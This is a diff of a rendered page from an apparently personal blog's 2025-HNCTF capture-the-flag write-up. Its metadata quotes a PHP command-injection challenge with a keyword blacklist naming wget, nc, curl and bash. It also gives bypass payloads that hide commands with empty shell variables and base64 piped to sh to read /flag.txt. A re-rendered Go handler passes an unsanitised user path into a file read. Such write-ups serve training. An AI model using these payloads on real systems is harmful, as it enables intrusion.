@@ -6,7 +6,7 @@
 
 <link rel='canonical' href='https://luo-kaihong.github.io/p/2025-hnctf/'>
 
-<link rel="stylesheet" href="/scss/style.min.946cca6c6259ef94ac55abfae7c7bf3291ea3ed5eea17ef77500b257217c6710.css"><meta property='og:title' content="2025-HNCTF">
+<link rel="stylesheet" href="/scss/style.min.6a692fd055deae459f2a9767f57f3855ba80cafd5041317f24f7360f6ca47cdf.css"><meta property='og:title' content="2025-HNCTF">
 <meta property='og:description' content="Really_Ez_Rce 考点：特殊变量$1到$9、$@和$*绕过关键词waf+base64编码绕过字符waf或者拼接绕过 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 &lt;?php header(&#39;Content-Type: text/html; charset=utf-8&#39;); highlight_file(__FILE__); error_reporting(0); if (isset($_REQUEST[&#39;Number&#39;])) { $inputNumber = $_REQUEST[&#39;Number&#39;]; if (preg_match(&#39;/\\d/&#39;, $inputNumber)) { die(&#34;不行不行,不能这样&#34;);\t#包含任何数字，程序终止 } if (intval($inputNumber)) { echo &#34;OK,接下来你知道该怎么做吗&#34;; if (isset($_POST[&#39;cmd&#39;])) { $cmd = $_POST[&#39;cmd&#39;]; if (!preg_match( &#39;/wget|dir|nl|nc|cat|tail|more|flag|sh|cut|awk|strings|od|curl|ping|\\\\*|sort|zip|mod|sl|find|sed|cp|mv|ty|php|tee|txt|grep|base|fd|df|\\\\\\\\|more|cc|tac|less|head|\\.|\\{|\\}|uniq|copy|%|file|xxd|date|\\[|\\]|flag|bash|env|!|\\?|ls|\\&#39;|\\&#34;|id/i&#39;, $cmd )) { echo &#34;你传的参数似乎挺正经的,放你过去吧&lt;br&gt;&#34;; system($cmd); } else { echo &#34;nonono,hacker!!!&#34;; } } } } 1 2 3 4 5 6 7 8 9 10 Number[]=1&amp;cmd=l$1s / Number[]=1&amp;cmd=echo bHMgLw== | bas$1e64 -d | s$1h\t#ls / Number[]=1&amp;cmd=echo Y2F0ICAvZmxhZy50eHQ= | bas$1e64 -d | s$1h\t#cat /flag 也可以拼接 cmd=a=l;b=s;$a$b / #执⾏ ls / cmd=a=b;b=ase64;c=s;d=h;echo Y2F0ICAvZmxhZy50eHQ= | $a$b -d | $c$d 这个就是数组绕过preg正则匹配，然后用特殊变量：$1到$9、$@和$*绕过waf，这些特殊变量输出为空，其实就是用它代替过滤掉的单引号和双引号,执行ls /后发现flag.txt，但是过滤了点号，*,?,所以就用base64过滤，\n">
 <meta property='og:url' content='https://luo-kaihong.github.io/p/2025-hnctf/'>
 <meta property='og:site_name' content='罗铠鸿'>
@@ -1749,41 +1749,41 @@
 </span><span class="lnt">34
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="line"><span class="cl"><span class="kn">package</span> <span class="nx">handle</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="p">(</span>
-</span></span><span class="line"><span class="cl">	<span class="s">&#34;fmt&#34;</span>
-</span></span><span class="line"><span class="cl">	<span class="s">&#34;moran/watch/utils&#34;</span>
-</span></span><span class="line"><span class="cl">	<span class="s">&#34;net/http&#34;</span>
-</span></span><span class="line"><span class="cl">	<span class="s">&#34;path/filepath&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="p">)</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="kd">func</span> <span class="nf">ReadFileHandle</span><span class="p">(</span><span class="nx">w</span> <span class="nx">http</span><span class="p">.</span><span class="nx">ResponseWriter</span><span class="p">,</span> <span class="nx">r</span> <span class="o">*</span><span class="nx">http</span><span class="p">.</span><span class="nx">Request</span><span class="p">)</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">	<span class="nx">userPath</span> <span class="o">:=</span> <span class="nx">r</span><span class="p">.</span><span class="nx">URL</span><span class="p">.</span><span class="nf">Query</span><span class="p">().</span><span class="nf">Get</span><span class="p">(</span><span class="s">&#34;path&#34;</span><span class="p">)</span> <span class="c1">// 从URL查询参数中获取path参数，存在注入风险</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">	<span class="nx">path</span> <span class="o">:=</span> <span class="nx">filepath</span><span class="p">.</span><span class="nf">Join</span><span class="p">(</span><span class="s">`\SystemRoot\`</span><span class="p">,</span> <span class="nx">userPath</span><span class="p">)</span> <span class="c1">// `\SystemRoot\` // 这是Windows系统的特殊路径，指向C:\Windows</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">	<span class="nx">handle</span><span class="p">,</span> <span class="nx">isDirectory</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">utils</span><span class="p">.</span><span class="nf">OpenPath</span><span class="p">(</span><span class="nx">path</span><span class="p">)</span> <span class="c1">// 尝试打开指定路径的文件或目录</span>
-</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">		<span class="nx">http</span><span class="p">.</span><span class="nf">Error</span><span class="p">(</span><span class="nx">w</span><span class="p">,</span> <span class="nx">fmt</span><span class="p">.</span><span class="nf">Sprintf</span><span class="p">(</span><span class="s">&#34;Error: %v&#34;</span><span class="p">,</span> <span class="nx">err</span><span class="p">),</span> <span class="nx">http</span><span class="p">.</span><span class="nx">StatusInternalServerError</span><span class="p">)</span> <span class="c1">// 处理打开文件时的错误</span>
-</span></span><span class="line"><span class="cl">		<span class="k">return</span>
-</span></span><span class="line"><span class="cl">	<span class="p">}</span>
-</span></span><span class="line"><span class="cl">	<span class="k">defer</span> <span class="nx">utils</span><span class="p">.</span><span class="nf">HandleClose</span><span class="p">(</span><span class="nx">handle</span><span class="p">)</span> <span class="c1">// 确保在函数返回时关闭文件句柄</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">	<span class="kd">var</span> <span class="nx">response</span> <span class="kt">string</span>
-</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="nx">isDirectory</span> <span class="p">{</span> <span class="c1">// 判断是否为目录</span>
-</span></span><span class="line"><span class="cl">		<span class="nx">response</span><span class="p">,</span> <span class="nx">err</span> <span class="p">=</span> <span class="nx">utils</span><span class="p">.</span><span class="nf">ListDirectory</span><span class="p">(</span><span class="nx">handle</span><span class="p">)</span> <span class="c1">// 如果是目录，列出目录内容</span>
-</span></span><span class="line"><span class="cl">	<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">		<span class="nx">response</span><span class="p">,</span> <span class="nx">err</span> <span class="p">=</span> <span class="nx">utils</span><span class="p">.</span><span class="nf">ReadFile</span><span class="p">(</span><span class="nx">handle</span><span class="p">)</span> <span class="c1">// 如果是文件，读取文件内容</span>
-</span></span><span class="line"><span class="cl">	<span class="p">}</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">		<span class="nx">http</span><span class="p">.</span><span class="nf">Error</span><span class="p">(</span><span class="nx">w</span><span class="p">,</span> <span class="nx">fmt</span><span class="p">.</span><span class="nf">Sprintf</span><span class="p">(</span><span class="s">&#34;Error: %v&#34;</span><span class="p">,</span> <span class="nx">err</span><span class="p">),</span> <span class="nx">http</span><span class="p">.</span><span class="nx">StatusInternalServerError</span><span class="p">)</span> <span class="c1">// 处理读取过程中的错误</span>
-</span></span><span class="line"><span class="cl">		<span class="k">return</span>
-</span></span><span class="line"><span class="cl">	<span class="p">}</span>
-</span></span><span class="line"><span class="cl">	<span class="nx">w</span><span class="p">.</span><span class="nf">Write</span><span class="p">([]</span><span class="nb">byte</span><span class="p">(</span><span class="nx">response</span><span class="p">))</span> <span class="c1">// 将读取的内容写入HTTP响应</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span></code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nx">handle</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="p">(</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="s">&#34;fmt&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="s">&#34;moran/watch/utils&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="s">&#34;net/http&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="s">&#34;path/filepath&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">func</span><span class="w"> </span><span class="nf">ReadFileHandle</span><span class="p">(</span><span class="nx">w</span><span class="w"> </span><span class="nx">http</span><span class="p">.</span><span class="nx">ResponseWriter</span><span class="p">,</span><span class="w"> </span><span class="nx">r</span><span class="w"> </span><span class="o">*</span><span class="nx">http</span><span class="p">.</span><span class="nx">Request</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="nx">userPath</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">r</span><span class="p">.</span><span class="nx">URL</span><span class="p">.</span><span class="nf">Query</span><span class="p">().</span><span class="nf">Get</span><span class="p">(</span><span class="s">&#34;path&#34;</span><span class="p">)</span><span class="w"> </span><span class="c1">// 从URL查询参数中获取path参数，存在注入风险</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="nx">path</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">filepath</span><span class="p">.</span><span class="nf">Join</span><span class="p">(</span><span class="s">`\SystemRoot\`</span><span class="p">,</span><span class="w"> </span><span class="nx">userPath</span><span class="p">)</span><span class="w"> </span><span class="c1">// `\SystemRoot\` // 这是Windows系统的特殊路径，指向C:\Windows</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="nx">handle</span><span class="p">,</span><span class="w"> </span><span class="nx">isDirectory</span><span class="p">,</span><span class="w"> </span><span class="nx">err</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">utils</span><span class="p">.</span><span class="nf">OpenPath</span><span class="p">(</span><span class="nx">path</span><span class="p">)</span><span class="w"> </span><span class="c1">// 尝试打开指定路径的文件或目录</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="k">if</span><span class="w"> </span><span class="nx">err</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">nil</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="nx">http</span><span class="p">.</span><span class="nf">Error</span><span class="p">(</span><span class="nx">w</span><span class="p">,</span><span class="w"> </span><span class="nx">fmt</span><span class="p">.</span><span class="nf">Sprintf</span><span class="p">(</span><span class="s">&#34;Error: %v&#34;</span><span class="p">,</span><span class="w"> </span><span class="nx">err</span><span class="p">),</span><span class="w"> </span><span class="nx">http</span><span class="p">.</span><span class="nx">StatusInternalServerError</span><span class="p">)</span><span class="w"> </span><span class="c1">// 处理打开文件时的错误</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="k">return</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="k">defer</span><span class="w"> </span><span class="nx">utils</span><span class="p">.</span><span class="nf">HandleClose</span><span class="p">(</span><span class="nx">handle</span><span class="p">)</span><span class="w"> </span><span class="c1">// 确保在函数返回时关闭文件句柄</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="kd">var</span><span class="w"> </span><span class="nx">response</span><span class="w"> </span><span class="kt">string</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="k">if</span><span class="w"> </span><span class="nx">isDirectory</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="c1">// 判断是否为目录</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="nx">response</span><span class="p">,</span><span class="w"> </span><span class="nx">err</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nx">utils</span><span class="p">.</span><span class="nf">ListDirectory</span><span class="p">(</span><span class="nx">handle</span><span class="p">)</span><span class="w"> </span><span class="c1">// 如果是目录，列出目录内容</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="nx">response</span><span class="p">,</span><span class="w"> </span><span class="nx">err</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nx">utils</span><span class="p">.</span><span class="nf">ReadFile</span><span class="p">(</span><span class="nx">handle</span><span class="p">)</span><span class="w"> </span><span class="c1">// 如果是文件，读取文件内容</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="k">if</span><span class="w"> </span><span class="nx">err</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">nil</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="nx">http</span><span class="p">.</span><span class="nf">Error</span><span class="p">(</span><span class="nx">w</span><span class="p">,</span><span class="w"> </span><span class="nx">fmt</span><span class="p">.</span><span class="nf">Sprintf</span><span class="p">(</span><span class="s">&#34;Error: %v&#34;</span><span class="p">,</span><span class="w"> </span><span class="nx">err</span><span class="p">),</span><span class="w"> </span><span class="nx">http</span><span class="p">.</span><span class="nx">StatusInternalServerError</span><span class="p">)</span><span class="w"> </span><span class="c1">// 处理读取过程中的错误</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="k">return</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="nx">w</span><span class="p">.</span><span class="nf">Write</span><span class="p">([]</span><span class="nb">byte</span><span class="p">(</span><span class="nx">response</span><span class="p">))</span><span class="w"> </span><span class="c1">// 将读取的内容写入HTTP响应</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
 </div>
 </div><p>再看题目的提示：注意go版本与路径，直接问无问</p>
 <img src="image-20250615205345556.png" alt="image-20250615205345556" style="zoom:50%;" />
@@ -2116,12 +2116,12 @@
             
                 
 <article class="">
-    <a href="/p/2023-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/">
+    <a href="/p/2025-%E6%98%A5%E7%A7%8B%E9%95%BF%E5%9F%8E%E6%9D%AF/">
         
         
 
         <div class="article-details">
-            <h2 class="article-title">2023-极客大挑战</h2>
+            <h2 class="article-title">2025-春秋长城杯</h2>
         </div>
     </a>
 </article>
@@ -2129,12 +2129,12 @@
             
                 
 <article class="">
-    <a href="/p/2025-%E7%AC%AC%E5%8D%81%E5%B1%8A%E4%B8%8A%E6%B5%B7%E5%A4%A7%E5%AD%A6%E7%94%9Fctf/">
+    <a href="/p/2025n1ctf/">
         
         
 
         <div class="article-details">
-            <h2 class="article-title">2025-第十届上海大学生ctf</h2>
+            <h2 class="article-title">2025N1CTF</h2>
         </div>
     </a>
 </article>
@@ -2142,12 +2142,12 @@
             
                 
 <article class="">
-    <a href="/p/2025-swpu-nssctf/">
+    <a href="/p/2025-%E6%B9%BE%E5%8C%BA%E6%9D%AF/">
         
         
 
         <div class="article-details">
-            <h2 class="article-title">2025-swpu-nssctf</h2>
+            <h2 class="article-title">2025-湾区杯</h2>
         </div>
     </a>
 </article>
@@ -2155,12 +2155,12 @@
             
                 
 <article class="">
-    <a href="/p/2025-8%E6%9C%88%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/">
+    <a href="/p/2025-%E5%87%BA%E9%A2%98/">
         
         
 
         <div class="article-details">
-            <h2 class="article-title">2025-8月每日一题</h2>
+            <h2 class="article-title">2025-出题</h2>
         </div>
     </a>
 </article>
@@ -2168,12 +2168,12 @@
             
                 
 <article class="">
-    <a href="/p/2025-nepctf/">
+    <a href="/p/2025-nss-4th/">
         
         
 
         <div class="article-details">
-            <h2 class="article-title">2025-Nepctf</h2>
+            <h2 class="article-title">2025-Nss-4th</h2>
         </div>
     </a>
 </article>
